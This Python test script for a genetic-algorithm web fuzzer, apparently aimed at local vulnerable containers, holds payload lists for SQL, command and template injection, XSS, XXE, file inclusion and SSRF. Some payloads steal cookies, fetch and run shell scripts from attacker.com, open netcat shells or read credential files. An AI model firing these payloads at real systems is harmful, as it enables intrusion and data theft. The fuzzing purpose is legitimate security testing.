#!/usr/bin/env python3
"""
Test script for genetic algorithm visualization.

This script runs the genetic algorithm visualizer with a more complex vulnerability
to demonstrate the visualization capabilities.
"""

import tkinter as tk
import threading
import time
import requests
import logging
from typing import Dict, List, Any

# Add the parent directory to the path so we can import our modules
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

from dragonshard.visualizer.genetic_viz import GeneticAlgorithmVisualizer
from dragonshard.fuzzing import GeneticMutator, GeneticPayload, PayloadType, ResponseAnalyzer

# Set up logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


class EnhancedGeneticVisualizer(GeneticAlgorithmVisualizer):
    """Enhanced genetic visualizer with more complex vulnerability testing."""

    def __init__(self, root: tk.Tk):
        """Initialize the enhanced visualizer."""
        super().__init__(root)
        self.root.title("DragonShard - Enhanced Genetic Algorithm Visualizer")

        # Add more complex payload types to the existing combobox
        if hasattr(self, "payload_type_var"):
            # Update the combobox values to include more payload types
            payload_types = [
                "SQL_INJECTION",
                "XSS",
                "COMMAND_INJECTION",
                "PATH_TRAVERSAL",
                "LFI",
                "RFI",
                "XXE",
                "SSRF",
                "TEMPLATE_INJECTION",
                "NOSQL_INJECTION",
            ]
            # Find the combobox and update its values
            for widget in self.root.winfo_children():
                if isinstance(widget, tk.Frame):
                    for child in widget.winfo_children():
                        if isinstance(child, tk.LabelFrame) and "Controls" in child.cget("text"):
                            for grandchild in child.winfo_children():
                                if isinstance(grandchild, ttk.Combobox):
                                    grandchild["values"] = payload_types
                                    break

    def get_base_payloads(self, payload_type: PayloadType) -> List[str]:
        """Get enhanced base payloads for the specified type."""
        if payload_type == PayloadType.SQL_INJECTION:
            return [
                "1' OR '1'='1",
                "admin'--",
                "1' UNION SELECT 1,2,3--",
                "1' AND 1=1--",
                "1' OR 1=1#",
                "' OR 1=1--",
                "'; DROP TABLE users--",
                "' UNION SELECT username,password FROM users--",
                "' OR 'x'='x",
                "admin' OR '1'='1'--",
            ]
        elif payload_type == PayloadType.XSS:
            return [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
                "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
                "<script>document.location='http://attacker.com?cookie='+document.cookie</script>",
                "<svg><script>alert(1)</script></svg>",
            ]
        elif payload_type == PayloadType.COMMAND_INJECTION:
            return [
                "127.0.0.1; ls",
                "127.0.0.1 && whoami",
                "127.0.0.1 | cat /etc/passwd",
                "127.0.0.1; id",
                "127.0.0.1 && pwd",
                "127.0.0.1; uname -a",
                "127.0.0.1 && cat /etc/shadow",
                "127.0.0.1; wget http://attacker.com/shell.sh",
                "127.0.0.1 && curl http://attacker.com/shell.sh | bash",
                "127.0.0.1; nc -l 4444 -e /bin/sh",
            ]
        elif payload_type == PayloadType.PATH_TRAVERSAL:
            return [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts",
                "../../../etc/shadow",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/hosts",
                "..%2F..%2F..%2Fetc%2Fshadow",
                "..%255c..%255c..%255cwindows%255csystem32%255cconfig%255csam",
            ]
        elif payload_type == PayloadType.LFI:
            return [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "../../../etc/shadow",
                "....//....//....//etc/hosts",
                "..%2F..%2F..%2Fetc%2Fshadow",
                "../../../proc/self/environ",
                "....//....//....//proc/self/environ",
                "..%2F..%2F..%2Fproc%2Fself%2Fenviron",
                "../../../var/log/apache2/access.log",
            ]
        elif payload_type == PayloadType.RFI:
            return [
                "http://attacker.com/shell.txt",
                "http://evil.com/backdoor.php",
                "ftp://attacker.com/shell.sh",
                "http://attacker.com/shell.jsp",
                "http://evil.com/webshell.asp",
                "http://attacker.com/shell.py",
                "http://evil.com/backdoor.rb",
                "http://attacker.com/shell.pl",
                "http://evil.com/webshell.cgi",
                "http://attacker.com/shell.ps1",
            ]
        elif payload_type == PayloadType.XXE:
            return [
                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hosts">]><data>&file;</data>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://attacker.com/evil.dtd">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.com/evil.xml">%remote;]><data>&send;</data>',
                '<?xml version="1.0"?><!DOCTYPE convert [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;%int;%send;]>',
            ]
        elif payload_type == PayloadType.SSRF:
            return [
                "http://localhost:8080/admin",
                "http://127.0.0.1:3306",
                "http://169.254.169.254/latest/meta-data/",
                "http://localhost:22",
                "http://127.0.0.1:6379",
                "http://localhost:5432",
                "http://127.0.0.1:27017",
                "http://localhost:5984",
                "http://127.0.0.1:9200",
                "http://localhost:11211",
            ]
        elif payload_type == PayloadType.TEMPLATE_INJECTION:
            return [
                "{{7*7}}",
                "{{config}}",
                "{{request}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{config.items()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}",
                "{{lipsum.__globals__['os'].popen('id').read()}}",
            ]
        elif payload_type == PayloadType.NOSQL_INJECTION:
            return [
                '{"$where": "1==1"}',
                '{"$ne": null}',
                '{"$gt": ""}',
                '{"$regex": ".*"}',
                '{"$exists": true}',
                '{"$in": ["admin", "user"]}',
                '{"$or": [{"admin": true}, {"user": true}]}',
                '{"$and": [{"username": "admin"}, {"password": {"$ne": ""}}]}',
                '{"$where": "this.username == \'admin\'"}',
                '{"$where": "this.password.length > 0"}',
            ]
        else:
            return ["test"]

    def create_fitness_function(self, target_url: str):
        """Create an enhanced fitness function with real HTTP requests."""

        def fitness_function(payload: GeneticPayload) -> float:
            try:
                # Add delay for visualization
                time.sleep(0.2)

                # Try to make a real HTTP request
                try:
                    response = requests.get(
                        f"{target_url}?input={payload.payload}",
                        timeout=5,
                        headers={"User-Agent": "DragonShard/1.0"},
                    )

                    # Analyze response for vulnerability indicators
                    fitness = 0.0

                    # Status code analysis
                    if response.status_code >= 500:
                        fitness += 0.4  # Server error - potential vulnerability
                    elif response.status_code == 200:
                        fitness += 0.2  # Successful response

                    # Content analysis
                    content = response.text.lower()
                    if any(
                        indicator in content
                        for indicator in ["error", "sql", "syntax", "mysql", "postgresql"]
                    ):
                        fitness += 0.3  # Database error indicators

                    if any(indicator in content for indicator in ["alert", "script", "javascript"]):
                        fitness += 0.2  # XSS reflection

                    if any(indicator in content for indicator in ["root:", "uid=", "gid="]):
                        fitness += 0.3  # Command injection indicators

                    # Response time analysis
                    if response.elapsed.total_seconds() > 1.0:
                        fitness += 0.1  # Slow response - potential injection

                    # Length analysis
                    if len(response.text) > 10000:
                        fitness += 0.1  # Large response - potential data leakage

                    return min(fitness, 1.0)

                except requests.exceptions.RequestException:
                    # If request fails, use payload characteristics
                    fitness = 0.0
                    fitness += min(len(payload.payload) / 100.0, 0.3)
                    special_chars = sum(1 for c in payload.payload if c in "'\"<>()[]{}|&;")
                    fitness += min(special_chars / 10.0, 0.3)
                    import random

                    fitness += random.random() * 0.4
                    return min(fitness, 1.0)

            except Exception as e:
                logger.debug(f"Fitness evaluation error: {e}")
                return 0.0

        return fitness_function

    def start_evolution(self):
        """Override to use enhanced target URL."""
        if self.running:
            self.stop_evolution()
            return

        try:
            # Get target URL from the existing entry
            target_url = self.url_var.get()
            payload_type_str = self.payload_type_var.get()
            payload_type = PayloadType[payload_type_str]

            logger.info(f"Starting evolution against {target_url} with {payload_type_str}")

            # Initialize genetic mutator
            self.mutator = GeneticMutator(
                population_size=15,
                mutation_rate=0.3,
                crossover_rate=0.7,
                max_generations=8,
                response_analyzer=ResponseAnalyzer(),
            )

            # Base payloads based on type
            base_payloads = self.get_base_payloads(payload_type)

            # Initialize population
            self.mutator.initialize_population(base_payloads, payload_type)

            # Create enhanced fitness function
            self.fitness_function = self.create_fitness_function(target_url)

            # Start evolution in separate thread
            self.running = True
            self.start_button.config(text="Stop Evolution")
            self.status_var.set(f"Running against {target_url}...")

            evolution_thread = threading.Thread(target=self.run_evolution, daemon=True)
            evolution_thread.start()

        except Exception as e:
            logger.error(f"Failed to start evolution: {e}")
            import tkinter.messagebox as messagebox

            messagebox.showerror("Error", f"Failed to start evolution: {e}")


def main():
    """Main function to run the enhanced genetic algorithm visualizer."""
    print("🧬 Starting DragonShard Genetic Algorithm Visualizer")
    print("=" * 60)
    print("This will open a Tkinter GUI showing real-time genetic algorithm evolution.")
    print("The visualizer will test against vulnerable Docker containers.")
    print("Make sure your test environment is running: make test-env-start")
    print("=" * 60)

    # Check if test environment is available
    try:
        response = requests.get("http://localhost:8082", timeout=5)
        print("✅ Test environment is available")
    except requests.exceptions.ConnectionError:
        print("⚠️  Test environment not available. Starting with simulated fitness...")
        print("   Run 'make test-env-start' to start vulnerable containers")

    # Start the GUI
    root = tk.Tk()
    app = EnhancedGeneticVisualizer(root)

    print("🎨 GUI started! Use the controls to start genetic evolution.")
    print("📊 Watch the real-time charts and payload evolution.")

    root.mainloop()


if __name__ == "__main__":
    main()
